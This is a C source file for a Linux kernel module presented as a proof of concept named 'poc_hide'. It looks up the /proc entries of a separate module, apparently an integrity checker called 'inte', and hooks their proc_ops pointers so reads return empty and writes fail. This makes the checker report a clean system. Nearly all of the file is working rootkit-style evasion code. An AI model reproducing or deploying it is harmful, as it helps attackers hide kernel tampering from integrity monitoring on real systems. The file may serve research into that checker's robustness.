// SPDX-License-Identifier: GPL-2.0-only
/*
 * Copyright (C) 2026 dere3046
 */

#define POC_NAME "poc_hide"
#define POC_DESC "hide inte proc as clean"

#include "poc_common.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("dere3046");
MODULE_DESCRIPTION(POC_DESC);

static void **slot_ko;
static void **slot_systbl;

static ssize_t hide_read(struct file *file, char __user *buf, size_t count,
			 loff_t *ppos)
{
	return 0;
}

static ssize_t hide_write(struct file *file, const char __user *buf,
			  size_t count, loff_t *ppos)
{
	return -EPERM;
}

static const struct proc_ops hide_ops = {
	.proc_read = hide_read,
	.proc_write = hide_write,
};

static int __init poc_init(void)
{
	unsigned long proc_ko_entry;
	unsigned long proc_systbl_entry;
	void *orig;
	int ret;

	ret = poc_init_common();
	if (ret)
		return ret;

	proc_ko_entry = poc_resolve_symbol("inte:proc_ko_entry");
	if (!proc_ko_entry) {
		poc_err("proc_ko_entry not found");
		return -ENOENT;
	}
	ret = poc_proc_slot(proc_ko_entry, &slot_ko);
	if (ret)
		return ret;
	ret = hk_ptr_hook(slot_ko, (void *)&hide_ops, &orig);
	if (ret)
		return ret;

	proc_systbl_entry = poc_resolve_symbol("inte:proc_systbl_entry");
	if (proc_systbl_entry) {
		ret = poc_proc_slot(proc_systbl_entry, &slot_systbl);
		if (!ret)
			hk_ptr_hook(slot_systbl, (void *)&hide_ops, &orig);
	}
	poc_info("hidden");
	return 0;
}

static void __exit poc_exit(void)
{
	if (slot_ko)
		hk_ptr_unhook(slot_ko);
	if (slot_systbl)
		hk_ptr_unhook(slot_systbl);
	poc_exit_common();
}

module_init(poc_init);
module_exit(poc_exit);
